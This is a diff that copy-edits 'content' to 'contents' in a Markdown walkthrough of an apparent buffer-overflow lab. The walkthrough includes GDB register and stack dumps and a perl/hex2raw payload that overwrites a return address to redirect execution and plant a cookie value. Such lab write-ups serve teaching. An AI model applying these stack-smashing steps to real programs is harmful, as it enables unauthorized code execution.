@@ -55,9 +55,9 @@ Address | Operation | Elements in operation
 
 **-Type < return > to continue, or q < return > to quit-**
 
-We can see from the row **0x08048b7a <+3>** that register %edx is filled with the content of stack which is located at %esp+0x20. Then, at row 0x08048b7e <+7> we can see that register %eax is filled with the content of stack which is located at %esp+0x28. Then, what are the values contained within those 2 blocks of stack? We'll see them later.
+We can see from the row **0x08048b7a <+3>** that register %edx is filled with the contents of stack which is located at %esp+0x20. Then, at row 0x08048b7e <+7> we can see that register %eax is filled with the contents of stack which is located at %esp+0x28. Then, what are the values contained within those 2 blocks of stack? We'll see them later.
 
-Then we can see from row 0x08048b82 <+11> that the content of register %eax is compared with the content of block located at 0x804d10c. So, after register %eax is being filled with the stack's value located at %esp+0x28, its value is compared with the value of certain memory. The result of comparison must be same so that we can enter the next process. Then, what is the value contained at address 0x804d10c? To find it, we must run the program and break at procedure **shooting_star()**. We can break at that procedure by changing the return address of **ah_choo()** into 08048b77. Use this command:
+Then we can see from row 0x08048b82 <+11> that the contents of register %eax is compared with the contents of block located at 0x804d10c. So, after register %eax is being filled with the stack's value located at %esp+0x28, its value is compared with the value of certain memory. The result of comparison must be same so that we can enter the next process. Then, what is the value contained at address 0x804d10c? To find it, we must run the program and break at procedure **shooting_star()**. We can break at that procedure by changing the return address of **ah_choo()** into 08048b77. Use this command:
 
 > perl -e 'print "61 "x32, "62 "x20, "77 8b 04 08"' > hex0<br />
 > ./hex2raw < hex0 > raw0<br />
@@ -73,7 +73,7 @@ And type this command:
 > Masukkan input:<br />
 > Breakpoint 1, 0x08048b77 in shooting_star ()<br />
 
-Now we can see the content of memory address 0x804d10c by typing this command:
+Now we can see the contents of memory address 0x804d10c by typing this command:
 
 > (gdb) x/ 0x804d10c<br />
 > 0x804d10c < cookie >:    496949284<br />
@@ -82,7 +82,7 @@ Now we can see the content of memory address 0x804d10c by typing this command:
 
 We can use command **p/x** to convert a number into hexadecimal representation.
 
-Evidently, the content of that memory address is our cookie! This means if we want to proceed to the next Assembly code, the value of register %eax must be same with our cookie (0x1d9ed824). 
+Evidently, the contents of that memory address is our cookie! This means if we want to proceed to the next Assembly code, the value of register %eax must be same with our cookie (0x1d9ed824). 
 
 The problem is, how to change the value of register %eax into our cookie?
 
@@ -93,12 +93,12 @@ Address | Operation | Elements in operation
 0x08048b7a <+3>:  |  mov  |  0x20(%esp), %edx
 0x08048b7e <+7>:  |  mov  |  0x28(%esp), %eax
 
-If we want to know the content of register %edx and %eax, we do need to see the content of the stack. Use this command (still using GDB):
+If we want to know the contents of register %edx and %eax, we do need to see the contents of the stack. Use this command (still using GDB):
 
 > (gdb) ni<br />
 > (gdb) x/20x $esp<br />
 
-The content of stack | | | | |
+The contents of stack | | | | |
 --- | --- | --- | --- | ---
 0x5568366c <_reserved+1037932>:  | 0x61616161  | 0x62626262  | 0x62626262  | 0x62626262
 0x5568367c <_reserved+1037948>:  | 0x62626262  | 0x62626262  | 0x08048b77  | 0x00000000
@@ -107,25 +107,25 @@ The content of stack | | | | |
 
 From the above stack, we can see that our string input, namely character 61 as much as 32 characters and character 62 as much as 20 characters fill the stack. Also the return address was changed into 0x08048b77 which is the address of **shooting_star()**. 
 
-Register %edx is filled with the content of stack located at %esp+0x20. Now, we see that the content of stack located at %esp+0x20. The address of register %esp is 0x5568366c. Use this command:
+Register %edx is filled with the contents of stack located at %esp+0x20. Now, we see that the contents of stack located at %esp+0x20. The address of register %esp is 0x5568366c. Use this command:
   
 > (gdb) x/ 0x5568366c+0x20<br />
 
-The content of stack | | | | |
+The contents of stack | | | | |
 --- | --- | --- | --- | ---
 0x5568368c <_reserved+1037964>:  | 0xf7fba000  | | |
 0x556836ac <_reserved+1037996>:  | 0xf7ff0500  |  0x55685680  |  0x5614541e  |  0x00000003
 
-So the content of stack located at %esp+0x20 is 0xf7fba000. This value is stored in register %edx.
+So the contents of stack located at %esp+0x20 is 0xf7fba000. This value is stored in register %edx.
 
-Now we see the content of stack located at %esp+0x28 which will be stored in register %eax. Use this command:
+Now we see the contents of stack located at %esp+0x28 which will be stored in register %eax. Use this command:
 
 > (gdb) x/ 0x5568366c+0x28<br />
 > 0x55683694 <_reserved+1037972>:    0x08048dcd<br />
 
-So, the content of stack located at %esp+0x28 is 0x08048dcd. This value is stored in register %eax. 
+So, the contents of stack located at %esp+0x28 is 0x08048dcd. This value is stored in register %eax. 
 
-Ok, now we have already known the position of address whose value will be stored in register %edx and %eax. Things that should be done now is we will give an additional string input so that the content at the corresponding stack address can be changed according to specification. The specification for register %eax is its value should be changed into our cookie. Then, how about register %edx which will also be compared with $0x59? Let see the code snippet for **shooting_star()**:
+Ok, now we have already known the position of address whose value will be stored in register %edx and %eax. Things that should be done now is we will give an additional string input so that the contents at the corresponding stack address can be changed according to specification. The specification for register %eax is its value should be changed into our cookie. Then, how about register %edx which will also be compared with $0x59? Let see the code snippet for **shooting_star()**:
 
 Address | Operation | Elements in operation
 --- | --- | ---
@@ -138,9 +138,9 @@ Wow, we can see that we won't compare the value of register %edx entirely with $
 
 The above illustration explains that the base register such as eax, ebx, ecx, and edx has 2 parts, namely the first part is 16 bit towards MSB (Most Significant Bit) which is marked by white block, and the second part is 16 bit towards LSB (Least Significant Bit) which is marked by grey block. For register eax, the second part is reffered to ax, where ax itself is divided into 2 small parts, namely ah and al which each of them holds 8 bit. From the illustration we can see that al is part of register %eax which contains the right most 8 bit (towards LSB). 
 
-In our case that concerns in dl, it means we're looking for register edx and dl itself refers to the right most content of register %edx (8 bit). 
+In our case that concerns in dl, it means we're looking for register edx and dl itself refers to the right most contents of register %edx (8 bit). 
 
-So, as we've already known the content of register %edx (0xf7fba000), we can conclude that the right most 8 bit is the right most two digits of hexadecimal representation, namely 00. That two digits must be changed into 59. So, the final value of register %edx should be 0xf7fba059.  
+So, as we've already known the contents of register %edx (0xf7fba000), we can conclude that the right most 8 bit is the right most two digits of hexadecimal representation, namely 00. That two digits must be changed into 59. So, the final value of register %edx should be 0xf7fba059.  
 
 Ok, let's start the exploit!
 
@@ -184,11 +184,11 @@ es       |     0x2b   |   43
 fs       |     0x0    |   0
 gs       |     0x63   |   99
 
-Great! As we can see, after we execute the command for filling the register %edx and %eax, the content of register %eax is our cookie and the **dl** value of register %edx is 59. Now let's see the stack's condition. Use this command:
+Great! As we can see, after we execute the command for filling the register %edx and %eax, the contents of register %eax is our cookie and the **dl** value of register %edx is 59. Now let's see the stack's condition. Use this command:
 
 > (gdb) x/20x $esp<br />
 
-The content of stack | | | | |
+The contents of stack | | | | |
 --- | --- | --- | --- | ---
 0x5568366c <_reserved+1037932>:  |  0x61616161  |  0x62626262  |  0x62626262  |  0x62626262
 0x5568367c <_reserved+1037948>:  |  0x62626262  |  0x62626262  |  0x08048b77  |  0x63636363
